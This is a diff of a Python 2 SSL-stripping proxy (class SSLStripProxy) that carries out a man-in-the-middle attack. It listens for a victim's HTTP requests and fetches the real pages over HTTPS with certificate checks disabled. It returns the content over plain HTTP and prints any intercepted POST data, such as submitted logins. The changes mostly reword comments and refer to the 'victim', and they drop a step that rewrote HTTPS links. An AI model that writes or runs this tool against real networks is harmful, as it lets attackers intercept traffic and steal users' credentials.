@@ -6,8 +6,8 @@ import gzip
 from StringIO import StringIO
 import errno
 
-ATTACKER_IP = "0.0.0.0"
-ATTACKER_PORT = 80
+ATTACKER_IP = "0.0.0.0" # Listen on all available network interfaces
+ATTACKER_PORT = 80 
 
 
 class SSLStripProxy(BaseHTTPRequestHandler):
@@ -23,11 +23,11 @@ class SSLStripProxy(BaseHTTPRequestHandler):
             headers = {
                 "User-Agent": "Mozilla/5.0",
                 "Accept": "*/*",
-                "Accept-Encoding": "identity",  # Disable compression
+                "Accept-Encoding": "identity",
                 "Host": host
             }
 
-            # Follow up to 5 redirects internally
+            # Follow up to 5 redirects to HTTPS internally if status is 301, 302, 303, 307 or 308
             for _ in range(5):
                 parsed = urlparse.urlparse(url)
                 conn = httplib.HTTPSConnection(parsed.hostname, parsed.port or 443, context=ssl._create_unverified_context())
@@ -42,29 +42,22 @@ class SSLStripProxy(BaseHTTPRequestHandler):
                 content = resp.read()
                 content_encoding = resp.getheader('Content-Encoding', '')
 
-                # Handle gzip
+                # Read and decompress gzip (required to display some websites properly)
                 if content_encoding == 'gzip':
                     buf = StringIO(content)
                     f = gzip.GzipFile(fileobj=buf)
                     content = f.read()
 
-                # If it's a redirect to HTTPS, follow it internally
+                # Check the status and redirect
                 if status in (301, 302, 303, 307, 308) and location.startswith("https://"):
                     print "[*] Following redirect to:", location
                     url = location
-                    continue  # Loop again
+                    continue
                 else:
-                    break  # Final response received
+                    break
 
-            # Optional: rewrite HTTPS links in content (basic)
-            if b"<html" in content.lower():
-                try:
-                    content = content.replace("https://", "http://")
-                except Exception:
-                    pass
-
-            # Return final content to client
-            self.send_response(200)  # Always respond 200 to client
+            # Return final content to victim
+            self.send_response(200)
             content_type = resp.getheader('Content-Type', 'text/html')
             self.send_header("Content-type", content_type)
             self.send_header("Content-Length", str(len(content)))
@@ -81,7 +74,7 @@ class SSLStripProxy(BaseHTTPRequestHandler):
 
         except Exception as e:
             self.send_error(502, "SSLStrip failed: {}".format(e))
-            
+
 
     def do_POST(self):
         host = self.headers.getheader('Host', '')
@@ -94,14 +87,13 @@ class SSLStripProxy(BaseHTTPRequestHandler):
             post_data = self.rfile.read(content_length)
             print "[*] POST data:", post_data
 
-            # Parse the target URL
             parsed = urlparse.urlparse(url)
             conn = httplib.HTTPSConnection(parsed.hostname, parsed.port or 443, context=ssl._create_unverified_context())
             path = parsed.path or "/"
             if parsed.query:
                 path += "?" + parsed.query
 
-            # Reconstruct headers for forwarding
+            # Reconstructing headers
             headers = {
                 "User-Agent": "Mozilla/5.0",
                 "Accept": "*/*",
@@ -111,7 +103,7 @@ class SSLStripProxy(BaseHTTPRequestHandler):
                 "Content-Length": str(len(post_data))
             }
 
-            # Forward the POST
+            # Forwarding the POST
             conn.request("POST", path, body=post_data, headers=headers)
             resp = conn.getresponse()
             content = resp.read()
@@ -122,6 +114,7 @@ class SSLStripProxy(BaseHTTPRequestHandler):
                 f = gzip.GzipFile(fileobj=buf)
                 content = f.read()
 
+            # Return response to victim
             self.send_response(resp.status)
             content_type = resp.getheader('Content-Type', 'text/html')
             self.send_header("Content-type", content_type)
